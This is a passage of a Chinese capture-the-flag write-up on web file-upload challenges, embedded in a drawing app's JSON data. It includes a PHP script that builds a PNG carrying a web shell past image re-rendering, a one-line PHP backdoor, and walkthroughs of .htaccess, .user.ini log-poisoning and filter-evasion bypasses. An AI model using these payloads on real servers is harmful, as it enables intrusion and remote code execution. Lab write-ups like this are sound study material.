array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log|\\(| |\\`/i', $str);\n}\necho json_encode($ret);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n找到检测中的区别：\n\ngetimagesize($_FILES[\"file\"][\"tmp_name\"]\n1\nIt is using the getimagesize function to retrieve information about an uploaded image file.\n\n$imageInfo = getimagesize($_FILES[\"file\"][\"tmp_name\"]);\n\nif ($imageInfo !== false) {\n    $width = $imageInfo[0];\n    $height = $imageInfo[1];\n    $mime = $imageInfo[\"mime\"];\n\n    echo \"Image width: \" . $width . \" pixels<br>\";\n    echo \"Image height: \" . $height . \" pixels<br>\";\n    echo \"Image MIME type: \" . $mime;\n} else {\n    echo \"Invalid image file\";\n}\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\nThis code retrieves the width, height, and MIME type of the uploaded image and displays them as output.\n\n因为检测MIME，所以需要添加文件头\n\nWeb162\nWeb164\n考点：PNG图片二次渲染\n这个题目奇奇怪怪的很多坑哟\n\n经过测试 只允许上传png\n\n直接上传一个我们普通的假的png木马图片 不会成功\n\n\n\n上传普通的木马图片 比如在尾部的木马 会被经过二次渲染而清除\n\n上传用脚本生成木马图片\n\n\n\n成功上传\n\n这个图片的生成方式如下：\n\n<?php\n  $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n             0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n             0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n             0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n             0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n             0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n             0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n             0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n  $r = $p[$y];\n  $g = $p[$y+1];\n  $b = $p[$y+2];\n  $color = imagecolorallocate($img, $r, $g, $b);\n  imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'./1.png');\n?>\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n对应的木马内容：<?$_GET[0]($_POST[1]);?>\n\n上传后直接点击查看图片\n\n\n\n然后进行传参\n\n\n\n会显示看不了，你以为失败了吗 其实并没有，这个时候CtrlS 保存图片 然后改成txt文本查看 就会发现 flag已经在图片里面了\n\n\n\n之所以在图片里面 感觉是因为二次渲染的功效吧\n\nWeb165\n考点：JPG图片二次渲染\n开题之后 png也上传不了\n\n测试后发现只能上传jpg文件\n\n目前遇到两个坑\n\n上传后查看图片无法抓包\n大爹脚本无法对下载后的图片进行渲染绕过 始终报错somethingwrong\n第一个坑之所以需要是因为查看jpg图片的返回包，我们可以很清晰的发现存在二次渲染的痕迹，即ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality\n\n解决方案：\n\n思考下我们抓包的内容是什么，是图片的信息，所以我们也可以直接下载图片然后txt打开就可以看到二次渲染的痕迹啦\n\n关于第二个 目前也没有解决 感觉需要审一下代码\n\n但是和A师傅要了一个武器库\n\n上传后直接连 不用考虑二次渲染问题，都处理好了\n\n\n\nweb166\n考点：zip文件包含\n开题CtrlU看一下\n\n\n\n发现只能上传zip文件\n\n想在压缩包后面写个一句话，直接在右侧栏中写就好\n\n\n\n\n\n成功上传后，找到这个下载文件的链接展开利用\n\n\n\n直接连蚁剑，拿下：\n\n\n\nWeb167\n考点：.htaccess解析\n\n\n只收jpg\n\n\n\n下载后可以发现木马仍然存在，所以是单纯的没有解析\n\n\n\n考虑尝试下htaccess进行解析\n\n\n\n上传成功\n\n在访问一下图片就能触发解析了\n\n\n\n直接连蚁剑，拿下\n\n\n\n现在一回顾可以发现其实题面也给出了提示\n\n\n\nhttpd\n\nweb168\n考点：基础免杀\n\n\n接收png，先上武器库图片\n\n发现带木马的图片直接传不了\n\n正常的可以传，如下\n\n\n\n我们通过这个正常上传的文件抓到上传包\n\n\n\n发现改php后缀可以上传成功\n\n\n\n猜测一下位置，发现也可以解析成功\n\n\n\n上传发现有内容检测，ban了一些东西，既然命令无法执行ls，那么使用var_dump遍历查询目录\n\n\n\n其中…表示上级目录\n\n\n\n想一下怎么读\n\n\n\n先试一下include\n\n被ban\n\n再试show_source\n\n\n\n成功 但是flag在flagaa.php\n\n总结一下：\n\n基础免杀的含义无非就是需要绕过几个函数罢了\n\n\n\n这是什么呢，存一下\n\nWeb169、170\n考点：高级免杀 包含日志\n\n\n开题发现只能传zip\n\n那么通过上传正常的zip文件进行抓包，然后进行利用\n\n注意如果zip文件有马，无法上传\n\n\n\n\n\n不知道为什么还是不行，但是抓到包了就足够了\n\nContent-Type: application/x-zip-compressed\n\n当这个类型是zip的时候始终无法上传\n\n修改为png\n\n\n\n直接成功\n\n\n\n而且可以发现对后缀也没有任何检测\n\n\n\ne 被ban了\n\n所以要做高级免杀，想到日志包含\n\n思路：\n\n把木马写在User-Agent中\n\n然后通过user.ini的设置 把指定的php文件自动加载也就是access.log\n\n设置user.ini\n\n\n\n写木马到access.log\n\n\n\n上传一个php文件触发\n\n\n\n访问一下1.php触发\n\n\n\n加载成功\n\n直接蚁剑链接 密码是1\n\n\n————————————————\n\n                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。\n                        \n原文链接：https://blog.csdn.net/jayq1/article/details/139420350"}],"appState":{"theme":"light","currentChartType":"bar","currentItemBackgroundColor":"transparent","currentItemEndArrowhead":"arrow","currentItemFillStyle":"hachure","currentItemFontFamily":1,"currentItemFontSize":20,"currentItemLinearStrokeSharpness":"round","currentItemOpacity":100,"currentItemRoughness":1,"currentItemStartArrowhead":null,"currentItemStrokeColor":"#000000","currentItemStrokeSharpness":"sharp","currentItemStrokeStyle":"solid","currentItemStrokeWidth":1,"currentItemTextAlign":"left","cursorButton":"up","editingGroupId":null,"elementLocked":false,"elementType":"selection","exportBackground":true,"exportScale":1,"exportEmbedScene":false,"exportWithDarkMode":false,"gridSize":null,"lastPointerDownWith":"mouse","name":"Untitled-2024-10-26-2324","openMenu":null,"previousSelectedElementIds":{"krosnCEaWiYt8yKBNmxGw":true,"Ctlfer0d3BrSDv8LoeuO2":true},"scrolledOutside":false,"scrollX":0,"scrollY":-400,"selectedElementIds":{"krosnCEaWiYt8yKBNmxGw":true},"selectedGroupIds":{},"shouldCacheIgnoreZoom":false,"showStats":false,"viewBackgroundColor":"#ffffff","zenModeEnabled":false,"zoom":{"value":1}},"files":{}}